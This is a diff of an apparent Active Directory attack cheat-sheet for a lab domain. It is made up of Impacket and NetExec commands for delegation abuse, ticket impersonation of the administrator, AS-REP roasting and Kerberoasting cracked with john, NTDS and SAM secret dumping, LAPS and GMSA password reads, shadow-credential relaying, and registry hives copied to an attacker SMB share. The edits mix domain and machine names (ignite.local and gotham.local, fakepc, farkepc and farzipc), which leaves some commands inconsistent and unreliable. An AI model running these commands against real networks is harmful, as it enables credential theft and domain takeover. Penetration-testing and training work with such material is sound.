@@ -5,12 +5,17 @@ impacket-GetADUsers ignite.local/Administrator:Ignite@987 -dc-ip 192.168.1.14 -a
 impacket-GetADComputers ignite.local/aarti:Password@1 -dc-ip 192.168.1.14
 impacket-addcomputer ignite.local/geet:Password@1 -computer-name fakepc -computer-pass Password@123 -dc-ip 192.168.1.14
 impacket-rbcd ignite.local/geet:Password@1 -action write -delegate-to 'DC$' -delegate-from 'farkepc$' -dc-ip 192.168.1.14
-impacket-getST ignite.local/'farzipc$':Password@123 -spn cifs/DC.ignite.local -impersonate administrator -dc-ip 192.168.1.14
-impacket-psexec ignite.local/administrator@DC.ignite.local -k -no-pass -dc-ip 192.168.1.14
+
+impacket-getST gotham.local/'farzipc$':Password@123 -spn cifs/DC.gotham.local -impersonate administrator -dc-ip 192.168.1.14
+export KRB5CCNAME=Administrator@cifs_file02@GOTHAM.COM.ccache
+impacket-psexec ignite.local/administrator@DC.gotham.local -k -no-pass -dc-ip 192.168.1.14
+
 impacket-GetNPUsers -dc-ip 192.168.1.14 ignite.local/ -usersfile users.txt -format john -outputfile hashes
 john -w=/usr/share/wordlists/rockyou.txt hashes
+
 impacket-GetUserSPNs -request -dc-ip 192.168.1.14 ignite.local/shivam:Password@1
 john -w=/usr/share/wordlists/rockyou.txt hashes
+
 impacket-secretsdump ignite.local/komal:Password@1@192.168.1.14
 impacket-GetLAPSPassword ignite.local/aarti:Password@1 -dc-ip 192.168.1.14
 impacket-secretsdump ignite.local/komal:Password@1@192.168.1.14 | grep GMSA
@@ -30,8 +35,8 @@ impacket-ntlmrelayx -t ldap://192.168.1.14 --shadow-credentials --shadow-target 
 
 nxc smb 192.168.1.14 --pfx-cert FZn7B2sQ.pfx --pfx-pass 05FY014jsNhqqL1IbDhr -u DC$ --ntds --user administrator
 
+#----- local dump
 impacket-smbserver share $(pwd) -smb2support
-
 impacket-reg ignite.local/aarav:Password@1@192.168.1.48 backup -o '\\192.168.1.16\share'
 impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save local
 
